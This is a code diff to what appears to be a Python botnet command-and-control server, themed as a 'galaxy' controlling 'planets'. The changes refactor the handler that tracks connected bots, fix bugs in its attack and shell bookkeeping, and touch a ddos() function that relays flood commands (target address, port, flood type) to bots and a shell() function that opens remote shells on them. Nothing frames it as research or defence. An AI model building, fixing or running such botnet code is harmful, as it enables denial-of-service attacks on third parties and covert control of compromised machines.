@@ -56,9 +56,7 @@ def bind_port():
             galaxy_online = True
         except OSError as e:
             if str(e) == "[Errno 98] Address already in use":
-                print(
-                    f"ERROR: Port {galaxy_port} is already in use. Retrying in 5 seconds..."
-                )
+                print(f"ERROR: Port {galaxy_port} is already in use. Retrying in 5 seconds...")
                 time.sleep(5)
             else:
                 raise e
@@ -74,35 +72,45 @@ def connection_handler():
             planet_id = token_hex(10)
             planet_ids.append(planet_id)
             planet.send(f"planet ID: {planet_id}".encode())
-            Thread(target=planet_handler, args=(planet, )).start()
+            Thread(target=PlanetHandler, args=(planet, )).start()
         except TimeoutError:
             pass
         except OSError as e:
-            if "Bad file descriptor" in str(e):
+            if str(e) == "[Errno 9] Bad file descriptor":
                 break
             else:
                 raise e
 
-
-def planet_handler(planet):
+class PlanetHandler:
     """Handle remote devices."""
-    while galaxy_online:
-        try:
-            data = planet.recv(1024).decode("ascii").lower().strip()
-            if not data:
-                pass
-            elif "offline" in data:
-                planet_index = planets.index(planet)
-                del planets[planet_index]
-                del planet_ips[planet_index]
-                del planet_ids[planet_index]
-            elif "stopping attack" in data:
-                planets_attacking.remove(planet)
-        except BrokenPipeError:
-            planet_index = planets.index(planet)
-            del planets[planet_index]
-            del planet_ips[planet_index]
-            del planet_ids[planet_index]
+    def __init__(self, planet):
+        self.planet = planet
+        self.planet_handler()
+
+
+    def remove_planet(self):
+        """Remove a remote planet."""
+        planet_index = planets.index(self.planet)
+        planets.remove(self.planet)
+        del planet_ips[planet_index]
+        del planet_ids[planet_index]
+        if self.planet in planets_attacking:
+            planets_attacking.remove(self.planet)
+        if self.planet in planets_shelled:
+            planets_shelled.remove(self.planet)
+
+
+    def planet_handler(self):
+        """Handle messages from a remote device."""
+        while galaxy_online:
+            try:
+                data = self.planet.recv(1024).decode("ascii").lower().strip()
+                if not data:
+                    break
+                elif "offline" in data:
+                    self.remove_planet()
+            except BrokenPipeError:
+                self.remove_planet()
 
 
 def ddos(cmd_ddos):
@@ -113,9 +121,7 @@ def ddos(cmd_ddos):
         return
     if cmd_ddos != "ddos stop":
         try:
-            targetAddr, targetPort, floodType = (
-                cmd_ddos.replace("ddos ", "").strip().split()
-            )
+            _, targetAddr, targetPort, floodType = cmd_ddos.strip().split()
         except ValueError:
             print("| ERROR: One or more arguments not specified.")
             return
@@ -123,6 +129,7 @@ def ddos(cmd_ddos):
         for ddos_i, planet in enumerate(planets_attacking):
             try:
                 planet.send(cmd_ddos.encode())
+                planets_attacking.remove(planet)
             except BrokenPipeError:
                 del planets[ddos_i]
                 del planet_ips[ddos_i]
@@ -229,6 +236,7 @@ def shell(cmd_shell):
         print("ERROR: Shelled planet is now offline.")
         print("Type 'help' for a list of commands.\n")
         shell_socket.close()
+        return
     planets_shelled.remove(shelled_planet)
 
 
@@ -298,7 +306,7 @@ while True:
                 if planets[i] in planets_attacking:
                     planet_attacking = True
                 if planets[i] in planets_shelled:
-                    planet_attacking = True
+                    planet_shelled = True
                 print(f"| {i + 1}. IP/Port: {planet_ip_port} | ID: {planet_ids[i]}")
                 print(f"| |-> Attacking: {planet_attacking} | Shelled: {planet_shelled}")
         else:
